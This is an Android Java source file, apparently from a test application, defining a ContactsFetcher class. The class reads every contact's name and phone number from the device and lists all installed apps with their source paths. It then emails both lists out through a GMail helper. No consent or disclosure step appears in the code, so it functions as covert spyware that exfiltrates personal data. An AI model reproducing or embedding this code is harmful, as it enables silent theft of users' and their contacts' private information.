package com.digitstory.testapplication.Services;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.digitstory.testapplication.Utils.Config;
import com.digitstory.testapplication.Utils.GMail;

import java.util.List;

public class ContactsFetcher {


    Context ctx;

    public ContactsFetcher(Context ctx){
        this.ctx = ctx;
    }


    public void getContactList() {
         StringBuilder sb = new StringBuilder("name, mobile\n");
        ContentResolver cr = ctx.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        Log.i(Config.TAG, "Name: " + name);
                        Log.i(Config.TAG, "Phone Number: " + phoneNo);
                        addContactsToList(name, phoneNo, sb);
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
        sendMail(sb);
        allApps();
    }


    private void allApps()
    {
        Log.d(Config.TAG, "all Apss");
        final PackageManager pm = ctx.getPackageManager();
//get a list of installed apps.
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        StringBuilder sb = new StringBuilder("Installed Apps Info\npackageInfo, name, sourceDir\n");
        for (ApplicationInfo packageInfo : packages) {
           /* Log.d(Config.TAG, "Installed package :" + packageInfo.packageName);
            Log.d(Config.TAG, "Source dir : " + packageInfo.sourceDir);
            Log.d(Config.TAG, "Launch Activity :" + packageInfo.packageName);
            Log.d(Config.TAG, packageInfo.name);*/
            sb.append(packageInfo.packageName + ", " + packageInfo.name + ", " + packageInfo.sourceDir);
            sb.append("\n");
        }
        sendMail(sb);

    }

    private void sendMail(StringBuilder sb) {

        final String emailBody = sb.toString();
        try {
            GMail gmail = new GMail(null, null, null, "MY_CONTACTS", emailBody);
            RunAsyncTask raTask = new RunAsyncTask(gmail, ctx);
            raTask.execute("MyContentObserver");
        } catch (Exception e) {
            Log.e(Config.TAG, e.getMessage(), e);
        }

    }


    private void addContactsToList(String name, String mobile, StringBuilder sb)
    {
        sb.append(name + ", " + mobile).append("\n");
    }
}
